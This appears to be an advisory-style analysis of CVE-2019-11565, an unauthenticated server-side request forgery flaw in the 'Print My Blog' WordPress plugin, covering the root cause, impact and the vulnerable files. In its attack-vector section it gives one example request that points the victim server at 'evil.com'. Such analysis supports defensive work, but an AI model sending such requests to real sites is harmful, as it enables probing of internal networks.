Based on the provided content, here's a breakdown of the vulnerability related to CVE-2019-11565:

**1. Verification:**
   - The provided content directly references "CVE-2019-11565" and describes a Server-Side Request Forgery (SSRF) vulnerability in the "Print My Blog" WordPress plugin, which aligns with the official CVE description.

**2. Root Cause of Vulnerability:**
   - The vulnerability stems from the `wp_remote_get()` function being called with an attacker-controlled URL. Specifically, the `site` parameter in the request is directly used in the function call within the `RestApiDetector` class.

**3. Weaknesses/Vulnerabilities Present:**
   - **Unauthenticated SSRF:** An attacker can supply an arbitrary URL through the `site` parameter. This allows the attacker to make the server send requests to internal or external resources.
   - **Lack of sanitization:** The code fails to properly sanitize or validate the user-supplied URL before using it in the `wp_remote_get()` function. Although a `sanitize_text_field` function was used on the output of the `getSite()` function, it did not prevent the SSRF, and did not affect the functionality of `setSite()`.
   - **Insecure plugin design:** The plugin is using an external URL to gather information about a website. This functionality should be restricted to prevent abuse.

**4. Impact of Exploitation:**
   - **Information disclosure:** An attacker could potentially access internal network resources or services that are not publicly accessible.
   - **Chained XSS attack:** The SSRF can be chained with a reflected Cross-Site Scripting (XSS) attack, by controlling the response from the malicious web server.
   - **Denial of Service:** The server could be used to flood another server.

**5. Attack Vectors:**
   - **HTTP GET request:** The vulnerability can be triggered by sending an HTTP GET request to the vulnerable WordPress site. The attacker supplies the malicious URL in the `site` parameter. For example, `http://victim.com/?print-my-blog=1&site=http://evil.com/`

**6. Required Attacker Capabilities/Position:**
   - **No authentication required:** The attacker does not need to be logged into the WordPress site to exploit the vulnerability.
   - **Network access:** The attacker must be able to send HTTP requests to the vulnerable WordPress site.
   - **Malicious Server:** The attacker needs a malicious web server to receive the requests sent by the vulnerable WordPress site.

**Additional Technical Details:**
   - The vulnerable code is located in `includes/controllers/PmbFrontend.php` and `includes/vendor/mnelson4/RestApiDetector/RestApiDetector.php`.
   - The `RestApiDetector` class is instantiated with user-controllable input from the `site` parameter.
   - The `getSelfHostedSiteInfo()` method makes the request using `wp_remote_get()` function
   - The `sslverify` parameter is set to `false` which may make exploitation easier.
